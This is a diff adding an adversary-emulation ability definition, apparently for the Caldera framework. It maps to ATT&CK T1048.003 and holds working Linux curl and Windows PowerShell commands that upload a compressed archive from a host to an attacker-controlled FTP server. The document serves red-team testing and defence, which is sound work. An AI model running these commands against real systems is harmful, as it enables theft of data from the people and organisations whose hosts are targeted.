@@ -1,0 +1,38 @@
+---
+
+- id: d754878c-17dd-46dc-891c-a993f8a10336
+  name: Exfil Compressed Archive to FTP Server
+  description: This ability exfiltrates a compressed archive to an FTP server.
+  tactic: exfiltration
+  technique:
+    attack_id: T1048.003
+    name: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol
+  platforms:
+    linux:
+      sh:
+        command: |
+          LocalFile='#{host.dir.compress}';
+          RemoteName="$(date '+%Y%m%d%H%M%S')-exfil-#{paw}-$(basename $LocalFile)";
+          curl -T #{host.dir.compress} ftp://#{ftp.server.address}/$RemoteName --user #{ftp.user.name}:'#{ftp.user.password}'
+    windows:
+      psh:
+        command: |
+          $SourceFile = (Get-Item #{host.dir.compress});
+          $RemoteName = "$(Get-Date -Format yyyymmddhhmmss)-exfil-#{paw}-$($SourceFile.name)";
+          $ftp = [System.Net.FtpWebRequest]::Create("ftp://#{ftp.server.address}/$RemoteName");
+          $ftp = [System.Net.FTPWebRequest]$ftp;
+          $ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile;
+          $ftp.Credentials = New-Object System.Net.NetworkCredential("#{ftp.user.name}", "#{ftp.user.password}");
+          $ftp.UseBinary = $true;
+          $ftp.UsePassive = $true;
+
+          $content = [System.IO.File]::ReadAllBytes("#{host.dir.compress}");
+          $ftp.ContentLength = $content.Length;
+          $requestStream = $ftp.GetRequestStream();
+          $requestStream.Write($content, 0, $content.Length);
+
+          $requestStream.Close();
+          $requestStream.Dispose();
+  requirements:
+    - plugins.stockpile.app.requirements.paw_provenance:
+        - source: host.dir.compress
